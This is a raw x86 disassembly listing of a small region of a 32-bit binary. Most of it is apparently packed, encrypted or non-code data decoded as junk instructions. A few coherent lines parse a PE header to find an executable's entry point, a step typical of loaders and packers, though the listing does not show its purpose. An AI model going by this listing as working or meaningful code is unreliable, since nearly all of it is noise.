  41d800:	xor    esp,DWORD PTR [ecx+0x95a48cd]
  41d806:	jmp    0x41d7e2
  41d808:	test   DWORD PTR [ebp+0x3548884f],0x3f229dfd
  41d812:	fsub   st,st(3)
  41d814:	xchg   edx,eax
  41d815:	ror    BYTE PTR [eax+0x6a],0xe4
  41d819:	and    al,0xc3
  41d81b:	add    eax,0xd3e21dd5
  41d820:	mov    cl,0x13
  41d822:	or     ecx,DWORD PTR [edi]
  41d824:	ficomp WORD PTR [ebx+ebp*2-0x8]
  41d828:	pop    ecx
  41d829:	inc    ecx
  41d82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82b:	ret    0xa1fb
  41d82e:	lahf   
  41d82f:	aas    
  41d830:	ja     0x41d8ae
  41d832:	rol    BYTE PTR [edi-0x57],0x5
  41d836:	dec    esi
  41d837:	xchg   DWORD PTR [ecx-0x2bea8991],esp
  41d83d:	repnz pop ds
  41d83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d840:	mov    BYTE PTR [edi+0x155509c1],ah
  41d846:	(bad)  
  41d847:	inc    ax
  41d849:	sbb    BYTE PTR [edx+0x8],ah
  41d84c:	and    DWORD PTR [eax+0x20f2a93d],eax
  41d852:	inc    eax
  41d853:	sbb    eax,0x1c1a045b
  41d858:	out    0x86,al
  41d85a:	sub    DWORD PTR es:[esi+0x74],esp
  41d85e:	pop    ebp
  41d85f:	mov    ds:0xe358331,al
  41d864:	jmp    0x257c49a3
  41d869:	xchg   esp,eax
  41d86a:	xor    eax,0x83cb09c
  41d86f:	call   0xe888:0x503ecac5
  41d876:	aad    0xf5
  41d878:	imul   edx
  41d87a:	add    esp,DWORD PTR [ecx+0x77]
  41d87d:	push   esi
  41d87e:	bound  esp,QWORD PTR [edx-0x2b]
  41d881:	in     al,dx
  41d882:	mov    edi,0xd827f3a7
  41d887:	and    DWORD PTR [eax+0x1455b3c5],ebx
  41d88d:	jg     0x41d8b4
  41d88f:	jmp    0x81d73329
  41d894:	xchg   ecx,eax
  41d895:	mov    dl,0x77
  41d897:	or     eax,0x35018544
  41d89c:	gs pop ebp
  41d89e:	xor    BYTE PTR [eax],ah
  41d8a0:	and    DWORD PTR [ecx+0x44],esi
  41d8a3:	mov    cl,0x4
  41d8a5:	ss mov cl,0x36
  41d8a8:	jo     0x41d886
  41d8aa:	fdiv   QWORD PTR [edx+0x40852bbc]
  41d8b0:	inc    esi
  41d8b1:	and    BYTE PTR [ecx-0x4ee023a6],al
  41d8b7:	leave  
  41d8b8:	imul   esi,DWORD PTR [ebx-0x1117bda4],0xffffffdd
  41d8bf:	mov    ah,0x90
  41d8c1:	test   al,0xf5
  41d8c3:	cmp    esi,DWORD PTR [esi-0x3a]
  41d8c6:	jg     0x41d8d3
  41d8c8:	cmp    al,0xa0
  41d8ca:	inc    esi
  41d8cb:	adc    eax,0xd96e7f9c
  41d8d0:	stos   DWORD PTR es:[edi],eax
  41d8d1:	cld    
  41d8d2:	push   esp
  41d8d3:	push   esp
  41d8d4:	xchg   ebp,eax
  41d8d5:	mov    eax,ds:0x9dda5d5c
  41d8da:	or     eax,0xb6d20721
  41d8df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8e0:	push   ss
  41d8e1:	sub    ecx,ebp
  41d8e3:	addr16 pop es
  41d8e5:	cmp    al,0xca
  41d8e7:	(bad)  
  41d8e8:	adc    bh,BYTE PTR [esi]
  41d8ea:	fild   WORD PTR [edx]
  41d8ec:	jns    0x41d901
  41d8ee:	dec    ebp
  41d8ef:	xor    eax,0x7adb6466
  41d8f4:	cmp    eax,0x3dfb800f
  41d8f9:	jmp    0x41d90c
  41d8fb:	jb     0x41d92a
  41d8fd:	xchg   BYTE PTR ds:0xab68d708,ch
  41d903:	add    edx,DWORD PTR [ebx-0x74473895]
  41d909:	push   esp
  41d90a:	and    al,0x18
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422598
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x732883bc,eax
  41d941:	jl     0x41d9c2
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x1b171818],bh
  41d94c:	xchg   esi,ebx
  41d94e:	mov    bh,0xae
  41d950:	add    DWORD PTR [edi-0x522c4294],edx
  41d956:	pushf  
  41d957:	ret    
  41d958:	push   edx
  41d959:	adc    WORD PTR [eax],sp
  41d95c:	pop    esi
  41d95d:	cs and bh,cl
  41d960:	mov    al,0x6c
  41d962:	cwde   
  41d963:	add    al,0x49
  41d965:	xor    bh,BYTE PTR [ecx]
  41d967:	push   eax
  41d968:	cmp    al,0x68
  41d96a:	xor    al,BYTE PTR [esi+0x46c58080]
  41d970:	pop    ebx
  41d971:	mov    esi,0x3083b05d
  41d976:	add    DWORD PTR [edx+0x23a3e5ce],ebx
  41d97c:	inc    ecx
  41d97d:	idiv   BYTE PTR [esp+edx*1]
  41d980:	fldlg2 
  41d982:	mov    al,0xf6
  41d984:	pop    ss
  41d985:	mov    dh,0x57
  41d987:	or     eax,0x34f59033
  41d98c:	jle    0x41d9ae
  41d98e:	jb     0x41d9d5
  41d990:	and    al,0x31
  41d992:	xor    DWORD PTR [ebx],ebx
  41d994:	sub    eax,0xd05dfcbe
  41d999:	push   edx
  41d99a:	cld    
  41d99b:	mov    ah,0xa1
  41d99d:	in     eax,0xb8
  41d99f:	in     eax,dx
  41d9a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a1:	fisubr DWORD PTR [ebp+esi*8+0x2]
  41d9a5:	or     BYTE PTR [edi+0x11e54c88],cl
  41d9ab:	inc    edx
  41d9ac:	sbb    dl,BYTE PTR [edi]
  41d9ae:	ja     0x41d9d1
  41d9b0:	icebp  
  41d9b1:	xor    BYTE PTR [ecx-0x41],dh
  41d9b4:	push   edx
  41d9b5:	pusha  
  41d9b6:	hlt    
  41d9b7:	enter  0x44f,0xeb
  41d9bb:	pop    eax
  41d9bc:	daa    
  41d9bd:	and    bh,BYTE PTR [edi]
  41d9bf:	pop    ds
  41d9c0:	xor    ah,BYTE PTR [ebx+0x14e7d819]
  41d9c6:	in     eax,dx
  41d9c7:	add    al,0xe9
  41d9c9:	sub    DWORD PTR [edx],esi
  41d9cb:	rcr    eax,1
  41d9cd:	popf   
  41d9ce:	shl    DWORD PTR [ebx-0x7c9b26b6],1
  41d9d4:	cdq    
  41d9d5:	lods   al,BYTE PTR ds:[esi]
  41d9d6:	mov    edx,0x6ea28899
  41d9db:	test   BYTE PTR [eax],bl
  41d9dd:	jne    0x41da54
  41d9df:	sbb    eax,0x52e3d3a
  41d9e4:	lock daa 
  41d9e6:	add    al,0x5d
  41d9e8:	pop    edx
  41d9e9:	adc    bh,BYTE PTR [ebp-0x4d]
  41d9ec:	les    edi,FWORD PTR [ebx*2-0x40d4f7f6]
  41d9f3:	adc    al,0xbe
  41d9f5:	iret   
  41d9f6:	mov    ebx,0x60f0f754
  41d9fb:	sbb    edi,DWORD PTR [ebx+0x23]
  41d9fe:	cmp    al,0x75
  41da00:	add    eax,0xcea13523
  41da05:	nop
  41da06:	ror    DWORD PTR [ebp-0x7],1
  41da09:	mov    BYTE PTR ds:0x5a59560b,ch
  41da0f:	adc    DWORD PTR [ecx+0x46],edi
  41da12:	repnz lds esp,FWORD PTR [eax+0x71]
  41da16:	sub    esp,edi
  41da18:	aaa    
  41da19:	sub    eax,0x42a471c1
  41da1e:	or     DWORD PTR [esi],0x5c1ce2aa
  41da24:	mov    ?,WORD PTR [esi]
  41da26:	mov    esi,0xf0fe313c
  41da2b:	aaa    
  41da2c:	or     DWORD PTR [ecx],esi
  41da2e:	fist   DWORD PTR [eax]
  41da30:	test   DWORD PTR [esi],edx
  41da32:	pop    edi
  41da33:	mul    BYTE PTR [ecx+0x1f]
  41da36:	pop    edi
  41da37:	test   al,0x44
  41da39:	aaa    
  41da3a:	mov    ebx,0x67ff506
  41da3f:	cli    
  41da40:	iret   
  41da41:	fidivr WORD PTR [eax+0x9]
  41da44:	sti    
  41da45:	jns    0x41da0f
  41da47:	fsub   st(3),st
  41da49:	sbb    al,0x7b
  41da4b:	pusha  
  41da4c:	(bad)  
  41da4e:	adc    DWORD PTR [ebp-0x35],0xd77703ab
  41da55:	push   eax
  41da56:	in     al,dx
  41da57:	pop    ss
  41da58:	int    0x2e
  41da5a:	push   cs
  41da5b:	(bad)  
  41da5c:	(bad)  
  41da5d:	jb     0x41da1b
  41da5f:	jns    0x41d9f2
  41da61:	pcmpgtw mm4,mm5
  41da64:	mov    bl,0x8d
  41da66:	jge    0x41dadd
  41da68:	ret    
  41da69:	xchg   esp,eax
  41da6a:	outs   dx,BYTE PTR ds:[esi]
  41da6b:	mov    ss,WORD PTR [edi+0x57726031]
  41da71:	out    dx,al
  41da72:	in     eax,dx
  41da73:	shl    esi,0x23
  41da76:	lock cmp BYTE PTR [eax+ecx*4],dl
  41da7a:	clc    
  41da7b:	push   ebp
  41da7c:	inc    ecx
  41da7d:	pop    eax
  41da7e:	loopne 0x41da70
  41da80:	fld    DWORD PTR [ecx+0x6a]
  41da83:	pusha  
  41da84:	lods   al,BYTE PTR ds:[esi]
  41da85:	adc    DWORD PTR [edx+edi*4-0x32],esp
  41da89:	xchg   DWORD PTR [eax-0x3e],edx
  41da8c:	lods   al,BYTE PTR ds:[esi]
  41da8d:	or     DWORD PTR [eax+0x3e10312f],edi
  41da93:	jne    0x41dae0
  41da95:	mov    edx,0xa1cfa2bd
  41da9a:	stos   BYTE PTR es:[edi],al
  41da9b:	out    dx,al
  41da9c:	add    al,0x72
  41da9e:	xor    DWORD PTR [eax-0x4e37c640],ebp
  41daa4:	xlat   BYTE PTR ds:[ebx]
  41daa5:	scas   eax,DWORD PTR es:[edi]
  41daa6:	std    
  41daa7:	mov    edi,0xef84f122
  41daac:	sahf   
  41daad:	dec    edi
  41daae:	out    0xdc,eax
  41dab0:	mov    ecx,0x32a92be8
  41dab5:	jns    0x41dafd
  41dab7:	inc    esi
  41dab8:	adc    DWORD PTR [edx+0x27],edx
  41dabb:	push   0x11
  41dabd:	in     al,dx
  41dabe:	or     edi,ecx
  41dac0:	mul    DWORD PTR [esi-0x6f61e42b]
  41dac6:	out    0xce,al
  41dac8:	imul   edx,DWORD PTR [eax+esi*4+0xf],0xffffffb7
  41dacd:	xchg   ebx,eax
  41dace:	inc    ecx
  41dacf:	sub    eax,0x1020df20
  41dad4:	mov    dl,cl
  41dad6:	inc    edi
  41dad7:	cli    
  41dad8:	out    dx,eax
  41dad9:	leave  
  41dada:	inc    ecx
  41dadb:	pop    eax
  41dadc:	pop    edx
  41dadd:	pop    ds
  41dade:	fldcw  WORD PTR [ebp+ecx*4+0x63]
  41dae2:	or     eax,0xd61d251d
  41dae7:	stc    
  41dae8:	arpl   WORD PTR [ebx],si
  41daea:	dec    ecx
  41daeb:	out    0xa4,al
  41daed:	xchg   edi,eax
  41daee:	std    
  41daef:	xchg   ebp,eax
  41daf0:	push   es
  41daf1:	in     al,dx
  41daf2:	adc    DWORD PTR [edi+eax*8+0x10d81314],0xffffffa0
  41dafa:	aaa    
  41dafb:	iret   
  41dafc:	ins    DWORD PTR es:[edi],dx
  41dafd:	pop    ds
  41dafe:	repz push ecx
  41db00:	arpl   WORD PTR [ecx+0x4b],bx
  41db03:	mov    ds:0x90b08323,eax
  41db08:	xchg   ebp,eax
  41db09:	xor    ecx,DWORD PTR cs:[ecx-0x6371a9b8]
  41db10:	(bad)  
  41db11:	mov    esi,0xf948e510
  41db16:	test   DWORD PTR [ecx],ebx
  41db18:	xchg   DWORD PTR [esi+0x79e0a5dd],ebx
  41db1e:	gs push esp
  41db20:	pop    ebx
  41db21:	jmp    0x12b:0xc4610cc2
  41db28:	jnp    0x41db9b
  41db2a:	adc    al,0xf5
  41db2c:	ret    0x5c2f
  41db2f:	rcl    bl,cl
  41db31:	loop   0x41dac1
  41db33:	stos   DWORD PTR es:[edi],eax
  41db34:	adc    ecx,DWORD PTR [edi+ecx*2-0x4f1f5cde]
  41db3b:	xchg   ebx,eax
  41db3c:	es loope 0x41db48
  41db3f:	cmp    DWORD PTR [edi],ebp
  41db41:	mov    WORD PTR [edi-0x66],es
  41db44:	scas   al,BYTE PTR es:[edi]
  41db45:	cmc    
  41db46:	outs   dx,BYTE PTR ds:[esi]
  41db47:	inc    eax
  41db48:	mov    ah,0x9e
  41db4a:	les    edi,FWORD PTR [edx-0x12]
  41db4d:	call   FWORD PTR [edi+0x4b]
  41db50:	jge    0x41dbbc
  41db52:	adc    esp,DWORD PTR [ecx+0x20]
  41db55:	xchg   esi,eax
  41db56:	call   0xeb808cbc
  41db5b:	xor    BYTE PTR [eax-0x17],0x93
  41db5f:	xor    esi,DWORD PTR [esi+0x5ede817a]
  41db65:	in     al,dx
  41db66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db67:	cwde   
  41db68:	dec    eax
  41db69:	dec    edi
  41db6a:	std    
  41db6b:	pop    edi
  41db6c:	jg     0x41db2d
  41db6e:	sbb    eax,0x49fef8f0
  41db73:	arpl   WORD PTR [eax-0x32a412cb],di
  41db79:	jne    0x41db66
  41db7b:	lahf   
  41db7c:	scas   al,BYTE PTR es:[edi]
  41db7d:	enter  0xbe84,0xe4
  41db81:	cmp    al,0x12
  41db83:	das    
  41db84:	add    DWORD PTR [edx],edi
  41db86:	pop    ds
  41db87:	cmp    al,0x9
  41db89:	jnp    0x41db99
  41db8b:	pop    eax
  41db8c:	lods   eax,DWORD PTR ds:[esi]
  41db8d:	repnz das 
  41db8f:	push   ss
  41db90:	xor    al,0x22
  41db92:	or     al,0x31
  41db94:	push   ds
  41db95:	xor    BYTE PTR [esi],bh
  41db97:	(bad)  
  41db98:	jmp    0x41dbcb
  41db9a:	jp     0x41dbf2
  41db9c:	jne    0x41db43
  41db9e:	fs je  0x41db58
  41dba1:	adc    al,0x69
  41dba3:	or     BYTE PTR [edi],dh
  41dba5:	mov    cs,WORD PTR [ebx]
  41dba7:	xor    al,0xf6
  41dba9:	das    
  41dbaa:	pushf  
  41dbab:	and    BYTE PTR [ebp-0x59182c15],bl
  41dbb1:	xchg   ecx,eax
  41dbb2:	sbb    DWORD PTR [ecx+0x7c91f2f7],0x69
  41dbb9:	stos   BYTE PTR es:[edi],al
  41dbba:	or     al,0x99
  41dbbc:	mov    ebp,es
  41dbbe:	addr16 push ebp
  41dbc0:	push   es
  41dbc1:	test   eax,0x7f29e490
  41dbc6:	add    ebp,esp
  41dbc8:	jge    0x41db6e
  41dbca:	das    
  41dbcb:	je     0x41db4f
  41dbcd:	add    eax,0x9fef0a0f
  41dbd2:	in     eax,0x1e
  41dbd4:	mov    ch,0xb7
  41dbd6:	sbb    al,0x2a
  41dbd8:	cmp    eax,0x40b47857
  41dbdd:	sbb    DWORD PTR [esi],edi
  41dbdf:	jecxz  0x41dbef
  41dbe1:	fucomp st(6)
  41dbe3:	std    
  41dbe4:	jbe    0x41dc5e
  41dbe6:	or     al,bl
  41dbe8:	jb     0x41dbb1
  41dbea:	mov    edi,0x371e5c22
  41dbef:	nop
  41dbf0:	cmp    eax,0x2f137dbd
  41dbf5:	idiv   DWORD PTR [ebx+0x26]
  41dbf8:	mov    ds:0x9156e098,eax
  41dbfd:	loop   0x41db8d
  41dbff:	popa   
  41dc00:	out    dx,al
  41dc01:	fwait
  41dc02:	daa    
  41dc03:	push   ecx
  41dc04:	pop    ecx
  41dc05:	lds    esi,FWORD PTR [edx-0x2b39d7dc]
  41dc0b:	cld    
  41dc0c:	out    0xb2,eax
  41dc0e:	sub    BYTE PTR [ebp+0x4faed5cc],0x6c
  41dc15:	adc    BYTE PTR [esi+0x683626aa],bh
  41dc1b:	jmp    0x41dba7
  41dc1d:	cdq    
  41dc1e:	sub    DWORD PTR ds:0xf161d6a9,esi
  41dc24:	mul    DWORD PTR [esi+0x20]
  41dc27:	xchg   ebx,eax
  41dc28:	test   eax,0x5b2302dc
  41dc2d:	pop    eax
  41dc2e:	retf   
  41dc2f:	cmp    ecx,DWORD PTR [eax+0x388f19b2]
  41dc35:	cli    
  41dc36:	add    BYTE PTR [ebx],dl
  41dc38:	ins    DWORD PTR es:[edi],dx
  41dc39:	mov    DWORD PTR [ebx+0x7e676f54],edx
  41dc3f:	shl    BYTE PTR [eax],cl
  41dc41:	xchg   ebx,eax
  41dc42:	mov    al,ds:0x71f81b53
  41dc47:	stos   BYTE PTR es:[edi],al
  41dc48:	imul   ecx,DWORD PTR [eax+ebp*4-0x72],0x70
  41dc4d:	lods   al,BYTE PTR ds:[esi]
  41dc4e:	sbb    eax,DWORD PTR [edx+0x7009afce]
  41dc54:	push   edi
  41dc55:	pop    eax
  41dc56:	out    0xee,eax
  41dc58:	imul   edx,DWORD PTR [ecx+0x1e1fd37d],0xffffffd1
  41dc5f:	(bad)  
  41dc60:	ins    BYTE PTR es:[edi],dx
  41dc61:	loop   0x41dcaa
  41dc63:	fisubr WORD PTR [edi]
  41dc65:	not    DWORD PTR [ebx]
  41dc67:	test   al,0x25
  41dc69:	inc    ebx
  41dc6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc6b:	aas    
  41dc6c:	xor    eax,0x42ddd5a8
  41dc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc73:	dec    ecx
  41dc74:	jbe    0x41dc47
  41dc76:	sbb    ah,BYTE PTR [ebp+eiz*4+0x4502c721]
  41dc7d:	sti    
  41dc7e:	ins    BYTE PTR es:[edi],dx
  41dc7f:	sbb    bh,BYTE PTR [ebx+0x39d4558d]
  41dc85:	iret   
  41dc86:	or     DWORD PTR [edx],ebp
  41dc88:	jecxz  0x41dc94
  41dc8a:	repz inc ebx
  41dc8c:	mov    dl,0xff
  41dc8e:	adc    al,0xcb
  41dc90:	test   eax,0x3596ab2d
  41dc95:	push   esp
  41dc96:	cmc    
  41dc97:	pop    ebx
  41dc98:	fisub  DWORD PTR [esi+0x4a58d0a8]
  41dc9e:	mov    ds:0xc3f7b3eb,al
  41dca3:	icebp  
  41dca4:	scas   eax,DWORD PTR es:[edi]
  41dca5:	xchg   esi,eax
  41dca6:	ss sbb al,0x4
  41dca9:	mov    ds:0x25f241f6,eax
  41dcae:	jne    0x41dc3b
  41dcb0:	pop    ss
  41dcb1:	aas    
  41dcb2:	add    BYTE PTR [ebp+0x3c25e6e8],bl
  41dcb8:	sbb    eax,0x85112d32
  41dcbd:	enter  0x2a3f,0xd2
  41dcc1:	sub    DWORD PTR [edx-0x51],ebx
  41dcc4:	imul   edi,DWORD PTR [edx-0x4],0xac35b28
  41dccb:	pop    esi
  41dccc:	sbb    al,0x59
  41dcce:	xor    edx,DWORD PTR [edi+0x44]
  41dcd1:	retf   0x78b3
  41dcd4:	jo     0x41dd0f
  41dcd6:	or     DWORD PTR [ebp+0x28845c18],edx
  41dcdc:	lods   al,BYTE PTR ds:[esi]
  41dcdd:	lds    edx,FWORD PTR [esi]
  41dcdf:	shl    BYTE PTR [ecx],1
  41dce1:	sbb    DWORD PTR [esi-0x7b33a6a0],ecx
  41dce7:	jb     0x41dd17
  41dce9:	ja     0x41dd36
  41dceb:	inc    ebp
  41dcec:	cmp    esp,edx
  41dcee:	adc    ah,0x46
  41dcf1:	jae    0x41dc9c
  41dcf3:	test   DWORD PTR [ecx-0x38],esp
  41dcf6:	mov    ss,WORD PTR [edx-0x13]
  41dcf9:	loop   0x41dd05
  41dcfb:	xor    cl,BYTE PTR [ebp+0x506c2444]
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x6
  41dd5b:	dec    bl
  41dd5d:	jo     0x41dd81
  41dd5f:	inc    edi
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x3bf8e7e8],bh
  41dd68:	in     al,0x30
  41dd6a:	sbb    BYTE PTR [esp+edx*2-0x23],bl
  41dd6e:	mov    ebp,0xd54cc248
  41dd73:	xchg   ecx,eax
  41dd74:	fnstsw WORD PTR [edi]
  41dd76:	and    di,WORD PTR [esi-0x74]
  41dd7a:	mov    al,ds:0x9050735b
  41dd7f:	loopne 0x41dd83
  41dd81:	(bad)  
  41dd82:	dec    ecx
  41dd83:	add    DWORD PTR [edi],ecx
  41dd85:	sbb    al,0x1c
  41dd87:	arpl   WORD PTR [eax-0x7e],di
  41dd8a:	cmc    
  41dd8b:	gs jp  0x41dd21
  41dd8e:	dec    ecx
  41dd8f:	(bad)
  41dd92:	cld    
  41dd93:	call   0xe14b8403
  41dd98:	jb     0x41ddfa
  41dd9a:	dec    ebx
  41dd9b:	mov    al,0x56
  41dd9d:	or     dh,BYTE PTR [ebx-0x5f82d402]
  41dda3:	xchg   ebp,eax
  41dda4:	mov    cl,0x8
  41dda6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda7:	call   0xda28:0x3d82df09
  41ddae:	add    ebp,DWORD PTR [edi]
  41ddb0:	sbb    BYTE PTR [esi-0x13],dh
  41ddb3:	cmp    ch,BYTE PTR [eax+0x348b7f25]
  41ddb9:	ficomp WORD PTR [edi]
  41ddbb:	ficom  WORD PTR [edi]
  41ddbd:	out    dx,al
  41ddbe:	mov    eax,0xb1b55a40
  41ddc3:	or     eax,0xa00b3515
  41ddc8:	push   ebx
  41ddc9:	call   0xaa54530d
  41ddce:	or     ch,bl
  41ddd0:	jnp    0x41de0a
  41ddd2:	aad    0xb5
  41ddd4:	(bad)  
  41ddd6:	jle    0x41de4e
  41ddd8:	in     eax,dx
  41ddd9:	(bad)  
  41ddda:	in     eax,dx
  41dddb:	and    esi,DWORD PTR [edi]
  41dddd:	in     eax,dx
  41ddde:	xchg   ebx,eax
  41dddf:	stos   BYTE PTR es:[edi],al
  41dde0:	lods   al,BYTE PTR ds:[esi]
  41dde1:	jg     0x41de11
  41dde3:	repz (bad) 
  41dde5:	call   0x8c2d16af
  41ddea:	xchg   esi,eax
  41ddeb:	mov    ds:0x8bd007ab,al
  41ddf0:	xchg   ecx,eax
  41ddf1:	fild   DWORD PTR ds:[ecx]
  41ddf4:	arpl   di,bp
  41ddf6:	inc    ebp
  41ddf7:	shr    DWORD PTR [ebx-0x162c49b9],0x25
  41ddfe:	cmp    DWORD PTR [ecx+0x56a94ad5],esp
  41de04:	sti    
  41de05:	xchg   BYTE PTR [ebp+0x1d0a08ea],bl
  41de0b:	jmp    0x7e8abb29
  41de10:	into   
  41de11:	jmp    0x53e4d89e
  41de16:	shl    DWORD PTR [edi+0x54],1
  41de19:	ss jg  0x41dd9e
  41de1c:	jge    0x41de96
  41de1e:	jmp    0xe277:0x7455a2f8
  41de25:	iret   
  41de26:	inc    ebp
  41de27:	pop    es
  41de28:	jl     0x41de85
  41de2a:	lea    ecx,[ecx+0x15d62edd]
  41de30:	loop   0x41ddfb
  41de32:	inc    edx
  41de33:	sub    BYTE PTR [ebp-0x31],bh
  41de36:	call   0xfc8e:0xb58eaae6
  41de3d:	mov    eax,ebp
  41de3f:	mov    ecx,0x78b8108c
  41de44:	sbb    edx,DWORD PTR [esi+0x51]
  41de47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de48:	jbe    0x41ddde
  41de4a:	push   ecx
  41de4b:	and    dl,BYTE PTR [ebx-0x263d1167]
  41de51:	adc    ah,BYTE PTR [ebp+0x4b3ef023]
  41de57:	xchg   esi,eax
  41de58:	test   BYTE PTR [edx-0x3c],dl
  41de5b:	out    dx,al
  41de5c:	xchg   ecx,eax
  41de5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de5e:	and    DWORD PTR [edi+0x3c1cbd55],edx
  41de64:	push   cs
  41de65:	ss xchg edx,esi
  41de68:	jno    0x41de07
  41de6a:	inc    edx
  41de6b:	fdivr  QWORD PTR [ebx]
  41de6d:	ror    eax,1
  41de6f:	in     eax,0x59
  41de71:	push   esi
  41de72:	into   
  41de73:	push   eax
  41de74:	shl    DWORD PTR [esi+eiz*4-0xd],cl
  41de78:	or     ecx,DWORD PTR [edx]
  41de7a:	xchg   edx,esi
  41de7c:	cmp    eax,0x3dc7584a
  41de81:	sbb    eax,0xea1e647f
  41de86:	mov    ah,0x88
  41de88:	sbb    bl,BYTE PTR [esi-0x56]
  41de8b:	push   0xfeea324e
  41de90:	adc    al,0x8f
  41de92:	adc    eax,0xb6eefd2c
  41de97:	daa    
  41de98:	xor    DWORD PTR [ecx+0x7f07b563],edx
  41de9e:	repz scas al,BYTE PTR es:[edi]
  41dea0:	not    DWORD PTR [ebp+0x3b483928]
  41dea6:	dec    ecx
  41dea7:	out    0x81,eax
  41dea9:	loope  0x41df1d
  41deab:	in     al,dx
  41deac:	sub    ch,dh
  41deae:	into   
  41deaf:	mov    dh,0xfb
  41deb1:	push   es
  41deb2:	and    DWORD PTR [ebx+0x62],esi
  41deb5:	mov    ds:0x5ac4ad11,eax
  41deba:	xchg   DWORD PTR [edi+eax*2-0x7214d600],edi
  41dec1:	loope  0x41ded4
  41dec3:	int3   
  41dec4:	(bad)  
  41dec6:	ret    0xaac4
  41dec9:	inc    ebp
  41deca:	jbe    0x41de7d
  41decc:	popf   
  41decd:	lahf   
  41dece:	popa   
  41decf:	(bad)  
  41ded0:	out    0xe3,al
  41ded2:	mov    esp,0x210815b7
  41ded7:	jle    0x41df24
  41ded9:	jmp    0x4f6a:0xdd836827
  41dee0:	pop    esp
  41dee1:	sbb    BYTE PTR [esi+0x18],0x6d
  41dee5:	iret   
  41dee6:	inc    esp
  41dee7:	aas    
  41dee8:	cmp    BYTE PTR [ebx-0x6dce1],dl
  41deee:	or     ah,BYTE PTR [edx+0x7]
  41def1:	sub    edi,esi
  41def3:	push   0x4b
  41def5:	loopne 0x41defa
  41def7:	sub    dl,ah
  41def9:	loopne 0x41dee9
  41defb:	shl    DWORD PTR [ecx],1
  41defd:	mov    ch,al
  41deff:	xchg   esp,eax
  41df00:	call   0x89ef:0x4a1e8a64
  41df07:	mov    DWORD PTR [esi+0x6a96d0a1],0x4a2221e1
  41df11:	inc    ebx
  41df12:	(bad)  
  41df13:	ficom  WORD PTR [edi+0x7c5fd306]
  41df19:	xor    bh,BYTE PTR [esi+0x2]
  41df1c:	pop    ds
  41df1d:	pop    ebx
  41df1e:	(bad)  [ecx]
  41df20:	dec    esp
  41df21:	call   0xfbe79761
  41df26:	not    DWORD PTR [edx+ebx*1]
  41df29:	popf   
  41df2a:	mov    esi,DWORD PTR [esi-0x46002936]
  41df30:	call   DWORD PTR [ecx+0x67]
  41df33:	stos   DWORD PTR es:[edi],eax
  41df34:	shl    BYTE PTR fs:[ecx+eax*4+0x5f],cl
  41df39:	cmc    
  41df3a:	xchg   dl,ch
  41df3c:	push   edx
  41df3d:	mov    ebx,esp
  41df3f:	sub    eax,0x35162f7e
  41df44:	inc    ebx
  41df45:	or     al,0x42
  41df47:	fstp   st(1)
  41df49:	pop    edi
  41df4a:	fwait
  41df4b:	(bad)  
  41df4c:	imul   ecx,DWORD PTR [ecx-0x4e],0xfffffff6
  41df50:	popa   
  41df51:	or     al,0xd6
  41df53:	call   0x6c7fc77e
  41df58:	cld    
  41df59:	push   edi
  41df5a:	das    
  41df5b:	popf   
  41df5c:	jle    0x41df57
  41df5e:	cmp    DWORD PTR [ecx],eax
  41df60:	fisub  DWORD PTR [ebp+edi*2-0x5a03187]
  41df67:	add    ebx,DWORD PTR [eax+ebp*2-0x55ca54e0]
  41df6e:	out    dx,al
  41df6f:	popf   
  41df70:	lods   eax,DWORD PTR ds:[esi]
  41df71:	ins    DWORD PTR es:[edi],dx
  41df72:	(bad)  
  41df73:	into   
  41df74:	popf   
  41df75:	inc    ecx
  41df76:	jg     0x41dff2
  41df78:	or     edi,DWORD PTR [ecx-0x4d276f39]
  41df7e:	push   cs
  41df7f:	loop   0x41dfb0
  41df81:	iret   
  41df82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df83:	hlt    
  41df84:	xor    eax,0xb728e895
  41df89:	into   
  41df8a:	cdq    
  41df8b:	mov    dl,0x60
  41df8d:	mov    ch,0x76
  41df8f:	xor    ebx,esp
  41df91:	jg     0x50f76f1c
